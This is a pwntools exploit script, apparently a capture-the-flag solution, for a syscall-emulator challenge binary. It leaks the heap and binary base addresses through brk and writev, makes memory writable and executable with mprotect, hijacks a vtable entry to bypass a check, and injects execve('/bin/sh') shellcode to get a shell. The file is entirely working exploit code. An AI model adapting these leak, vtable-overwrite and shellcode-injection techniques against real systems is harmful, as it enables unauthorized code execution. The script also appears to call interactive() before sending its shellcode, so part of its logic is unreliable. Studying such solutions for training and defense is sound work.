from pwn import *

R = process('./chall')
elf = ELF('./chall')

def run_syscall(r, n, args, recv_ret=True):
    r.sendlineafter('syscall:', str(n))
    for i in range(3):
        if i < len(args):
            r.sendlineafter('arg', str(args[i]))
        else:
            r.sendlineafter('arg', str(0))
    if recv_ret:
        r.recvuntil('retval: ')
        return int(r.recvline()[:-1], 16)

def get_heap(r):
    # call brk(0) to leak heap addr.
    heap_base = run_syscall(r, 12, [0]) - 0x21000
    log.info("heap_base: "+hex(heap_base))
    return heap_base

def get_procbase(r, e, heap_base):
    # call writev(1, heap+0x11e70, 1) to leak proc base.
    # first 16 bytes of Emulator (vtable, rax) can be regarded as an iovec.
    run_syscall(r, 20, [1, heap_base + 0x11e70, 1], recv_ret=False)
    r.recvline()
    proc_base = u64(r.recv(8)) - e.symbols[b'_ZN8Emulator3setENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERm']
    log.info("proc_base: "+hex(proc_base))
    return proc_base

def can_write_to_vtable(r, proc_base):
    # mprotect(proc+0x202000, 0x1000, PROT_READ|PROT_WRITE)
    run_syscall(r, 10, [proc_base + 0x202000, 0x1000, 0b011])

def can_exec_in_heap(r, heap_base):
    # mprotect(heap+0x11000, 0x100, PROT_READ|PROT_WRITE|PROT_EXEC)
    # to exec 'xor rax, rax; ret;' gadget in heap
    run_syscall(r, 10, [heap_base + 0x11000, 0x1000, 0b111])

def disable_emulator_check(r, e, proc_base, heap_base):
    # readv(0, heap + 0x11e70, 1) 
    # to overwrite emulator::check in vtable
    # by same method in get_proc_base function.
    run_syscall(r, 19, [0, heap_base + 0x11e70, 1], recv_ret=False)
    # arg3 value is placed at this gadget addr
    xor_rax_rax_ret = heap_base + 0x11e90
    payload = p64(proc_base+e.symbols[b'_ZN8Emulator3setENSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEERm'])
    payload += p64(xor_rax_rax_ret)
    r.send(payload)

def write_shellcode(r, shellcode_addr):
    # read(0, shellcode_addr, 0xc3c03148)
    # emulator::check is disbled for setting 0xc3c03148
    # (xor_rax_rax_ret) to arg3 value. 
    run_syscall(r, 0, [0, shellcode_addr, 0xc3c03148], recv_ret=False)
    shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
    r.interactive()
    r.send(shellcode)

def overwrite_vtable_to_shellcodeaddr(r, shellcode_addr, proc_base):
    # read(0, proc_base+vtable+8, 0xc3c03148)
    # overwrite Emulator::check in vtable.
    payload = p64(shellcode_addr)
    vtable = 0x202ce0
    run_syscall(r, 0, [0, proc_base + vtable + 8, 0xc3c03148], recv_ret=False)
    r.send(payload)

def run_shell(r):
    run_syscall(r, 0, [0, 0, 0], recv_ret=False)
    r.interactive()

def main(r, e):
    heap_base = get_heap(r)
    proc_base = get_procbase(r, e, heap_base)
    can_write_to_vtable(r, proc_base)
    can_exec_in_heap(r, heap_base)
    disable_emulator_check(r, e, proc_base, heap_base)
    shellcode_addr = heap_base + 0x11000
    write_shellcode(r, shellcode_addr)
    overwrite_vtable_to_shellcodeaddr(r, shellcode_addr, proc_base)
    run_shell(r)

if __name__ == '__main__':
    main(R, elf)
